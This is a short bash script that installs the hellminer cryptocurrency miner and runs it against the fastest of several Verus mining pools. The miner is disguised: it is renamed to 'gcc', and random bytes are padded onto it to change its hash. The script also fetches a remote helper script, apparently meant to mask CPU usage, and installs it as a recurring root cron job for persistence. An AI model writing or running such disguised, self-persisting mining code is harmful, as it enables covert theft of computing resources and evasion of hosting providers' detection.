#!/bin/bash

address=$1
worker_name=$2
threads=$(nproc)
apt install libsodium23 libsodium-dev bc cron -y
if ! command -v tcping & > /dev/null
then
    echo "tcping 不存在，正在安装..."
    wget https://github.com/cloverstd/tcping/releases/download/v0.1.1/tcping-linux-amd64-v0.1.1.tar.gz && tar -zxvf tcping-linux-amd64-v0.1.1.tar.gz 
    mv tcping  /usr/bin/tcping && chmod +x  /usr/bin/tcping 
    rm -rf tcping-linux-amd64-v0.1.1.tar.gz 
    echo "tcping 安装完成"
else
    echo "tcping 已经安装"
fi
#grep -o 'avx2' /proc/cpuinfo
urls=("cn.vipor.net" "sg.vipor.net" "ussw.vipor.net" "usw.vipor.net" "pl.vipor.net" "usse.vipor.net" "fr.vipor.net" "de.vipor.net" "fi.vipor.net" "sa.vipor.net") #vipor
#urls=("na.luckpool.net" "eu.luckpool.net" "ap.luckpool.net") #luck
# 初始化最低延迟和最佳URL
min_latency=1000000
best_url=""

# 循环测试每个URL
for url in "${urls[@]}"; do
  # 使用ping命令测试延迟，提取平均延迟值
  latency=$(tcping -c 2 "$url" | tail -1 | awk -F '/' '{print $5}')
  
  # 检查是否是最低延迟
  if (( $(echo "$latency < $min_latency" | bc -l) )); then
    min_latency=$latency
    best_url=$url
  fi
  
  # 输出每个URL的延迟
  echo "$url 延迟: $latency ms"
done

# 输出最低延迟的URL
echo "最低延迟的URL是: $best_url，延迟: $min_latency ms"

mkdir vrsc && cd vrsc
wget -O gcc.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
tar -zxvf gcc.tar.gz && rm -rf gcc.tar.gz
count=$((RANDOM % 1000 + 1))
for ((i = 0; i < count; i++)); do
  echo -n "0" >> "hellminer"
done
mv hellminer gcc
wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
chmod u+x *
cron_job="0 */2 * * * /root/vrsc/random_usage.sh"
# 检查任务是否已经存在
(crontab -l | grep -qF "$cron_job") || (crontab -l; echo "$cron_job") | crontab -
service cron reload
service crond reload
./gcc -c stratum+ssl://$best_url:5140  -u $address.$worker_name -p x --cpu $threads
